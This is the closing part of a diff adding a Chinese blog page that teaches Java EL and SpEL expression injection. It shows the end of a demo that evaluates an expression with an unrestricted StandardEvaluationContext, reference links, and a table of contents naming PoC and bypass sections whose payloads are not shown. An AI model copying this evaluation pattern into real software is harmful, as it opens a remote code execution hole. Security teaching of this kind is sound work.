class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardEvaluationContext</span>();</span><br><span class="line">        expression.getValue(context);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-EL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/#0x05-EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">Java 之 EL 表达式注入 | Drunkbaby’s Blog (drun1baby.top)</a></p>
+<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/#%E5%9F%BA%E7%A1%80-PoC-amp-Bypass-%E6%95%B4%E7%90%86">Java 之 SpEL 表达式注入 | Drunkbaby’s Blog (drun1baby.top)</a></p>
+<p><a target="_blank" rel="noopener" href="http://rui0.cn/archives/1043">由浅入深SpEL表达式注入漏洞 - Ruilin (rui0.cn)</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#EL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">EL 表达式注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E8%A6%81%E7%89%B9%E7%82%B9%E5%92%8C%E7%94%A8%E9%80%94"><span class="toc-number">1.1.</span> <span class="toc-text">主要特点和用途</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.2.</span> <span class="toc-text">示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">基础语法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%8F%98%E9%87%8F"><span class="toc-number">1.3.1.</span> <span class="toc-text">获取变量</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-1"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="toc-number">1.3.2.</span> <span class="toc-text">操作符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%90%E5%BC%8F%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.3.3.</span> <span class="toc-text">隐式对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BD%9C%E7%94%A8%E5%9F%9F%E7%9B%B8%E5%85%B3%E7%9A%84%E9%9A%90%E5%BC%8F%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.3.4.</span> <span class="toc-text">1. 作用域相关的隐式对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%AF%B7%E6%B1%82%E7%9B%B8%E5%85%B3%E7%9A%84%E9%9A%90%E5%BC%8F%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.3.5.</span> <span class="toc-text">2. 请求相关的隐式对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%85%B6%E4%BB%96%E9%9A%90%E5%BC%8F%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.3.6.</span> <span class="toc-text">3. 其他隐式对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-2"><span class="toc-number">1.3.7.</span> <span class="toc-text">示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.8.</span> <span class="toc-text">函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89EL%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.8.1.</span> <span class="toc-text">定义EL函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0EL%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.8.2.</span> <span class="toc-text">实现EL函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%A8JSP%E4%B8%AD%E4%BD%BF%E7%94%A8EL%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.8.3.</span> <span class="toc-text">在JSP中使用EL函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A6%81%E7%94%A8-%E5%90%AF%E7%94%A8EL%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">1.3.9.</span> <span class="toc-text">禁用&#x2F;启用EL表达式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E7%A6%81%E7%94%A8EL%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">1.3.9.1.</span> <span class="toc-text">全局禁用EL表达式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%95%E4%B8%AA%E6%96%87%E4%BB%B6%E7%A6%81%E7%94%A8EL%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">1.3.9.2.</span> <span class="toc-text">单个文件禁用EL表达式</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.</span> <span class="toc-text">EL注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E7%94%A8-PoC"><span class="toc-number">1.4.1.</span> <span class="toc-text">通用 PoC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.</span> <span class="toc-text">绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80-EXP"><span class="toc-number">1.5.1.</span> <span class="toc-text">基础 EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-ScriptEngine-%E8%B0%83%E7%94%A8-JS-%E5%BC%95%E6%93%8E%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.2.</span> <span class="toc-text">利用 ScriptEngine 调用 JS 引擎绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC%E8%A7%A3%E9%87%8A"><span class="toc-number">1.5.3.</span> <span class="toc-text">POC解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.5.4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-Unicode-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.5.</span> <span class="toc-text">利用 Unicode 编码绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%85%AB%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.6.</span> <span class="toc-text">利用八进制编码绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">SPEL表达式注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%9F%BA%E7%A1%80"><span class="toc-number">2.2.</span> <span class="toc-text">SpEL 表达式基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SPEL%E5%AE%9A%E7%95%8C%E7%AC%A6"><span class="toc-number">2.2.1.</span> <span class="toc-text">SPEL定界符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.2.2.</span> <span class="toc-text">SPEL表达式类型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E9%9D%A2%E9%87%8F%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">字面量表达式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B1%9E%E6%80%A7%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">属性表达式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">2.2.2.3.</span> <span class="toc-text">方法表达式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%AC%A6%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">2.2.2.4.</span> <span class="toc-text">操作符表达式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B1%BB%E5%9E%8B%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">2.2.2.5.</span> <span class="toc-text">类型表达式</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SpEL-%E7%94%A8%E6%B3%95"><span class="toc-number">2.3.</span> <span class="toc-text">SpEL 用法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%B6%E6%84%8F%E6%8C%87%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.3.1.</span> <span class="toc-text">恶意指令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E7%B1%BB%E5%AE%9E%E4%BE%8B"><span class="toc-number">2.3.2.</span> <span class="toc-text">创建类实例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SpEL%E8%BF%90%E7%AE%97"><span class="toc-number">2.3.3.</span> <span class="toc-text">SpEL运算</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E8%BF%90%E7%AE%97"><span class="toc-number">2.3.3.1.</span> <span class="toc-text">基本运算</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AE%97%E6%95%B0%E8%BF%90%E7%AE%97"><span class="toc-number">2.3.3.1.1.</span> <span class="toc-text">算数运算</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B3%E7%B3%BB%E8%BF%90%E7%AE%97"><span class="toc-number">2.3.3.1.2.</span> <span class="toc-text">关系运算</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97"><span class="toc-number">2.3.3.1.3.</span> <span class="toc-text">逻辑运算</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E8%BF%90%E7%AE%97"><span class="toc-number">2.3.3.1.4.</span> <span class="toc-text">条件运算</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">2.3.3.1.5.</span> <span class="toc-text">正则表达式</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9B%86%E5%90%88%E6%93%8D%E4%BD%9C"><span class="toc-number">2.3.3.2.</span> <span class="toc-text">集合操作</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E8%AE%BF%E9%97%AE%E9%9B%86%E5%90%88%E5%85%83%E7%B4%A0"><span class="toc-number">2.3.3.2.1.</span> <span class="toc-text">1. 访问集合元素</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%98%A0%E5%B0%84%E6%93%8D%E4%BD%9C"><span class="toc-number">2.3.3.2.2.</span> <span class="toc-text">2. 映射操作</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E9%9B%86%E5%90%88%E8%BF%87%E6%BB%A4"><span class="toc-number">2.3.3.2.3.</span> <span class="toc-text">3. 集合过滤</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E9%9B%86%E5%90%88%E6%8A%95%E5%BD%B1"><span class="toc-number">2.3.3.2.4.</span> <span class="toc-text">4. 集合投影</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E9%9B%86%E5%90%88%E6%8E%92%E5%BA%8F"><span class="toc-number">2.3.3.2.5.</span> <span class="toc-text">5. 集合排序</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-%E9%9B%86%E5%90%88%E8%81%9A%E5%90%88"><span class="toc-number">2.3.3.2.6.</span> <span class="toc-text">6. 集合聚合</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#7-%E9%9B%86%E5%90%88%E8%BD%AC%E6%8D%A2"><span class="toc-number">2.3.3.2.7.</span> <span class="toc-text">7. 集合转换</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81%E5%8F%82%E8%80%83"><span class="toc-number">2.3.3.2.8.</span> <span class="toc-text">完整代码参考</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E6%96%B9%E6%B3%95"><span class="toc-number">2.3.4.</span> <span class="toc-text">自定义方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SPEL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.4.</span> <span class="toc-text">SPEL注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.4.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC"><span class="toc-number">2.4.2.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass"><span class="toc-number">2.4.3.</span> <span class="toc-text">bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JavaScript-Engine-Bypass"><span class="toc-number">2.4.4.</span> <span class="toc-text">JavaScript Engine Bypass</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/07/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/07/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&text=表达式注入"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/07/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&title=表达式注入"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/07/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&is_video=false&description=表达式注入"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=表达式注入&body=Check out this article: http://example.com/2024/07/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/07/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&title=表达式注入"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/07/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&title=表达式注入"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/07/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&title=表达式注入"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/07/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&title=表达式注入"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/07/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&name=表达式注入&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/07/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&t=表达式注入"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+      <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2016-2025
+        John Doe
+      </div>
+      <div class="footer-right">
+        <nav>
+          <ul>
+            <!--
+          --><li><a href="/">首页</a></li><!--
+        --><!--
+          --><li><a href="/about/">关于</a></li><!--
+        --><!--
+          --><li><a href="/archives/">归档</a></li><!--
+        --><!--
+          --><li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li><!--
+        -->
+          </ul>
+          <ul>
+            
+              <!-- 不蒜子统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+        </nav>
+      </div>
+      
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
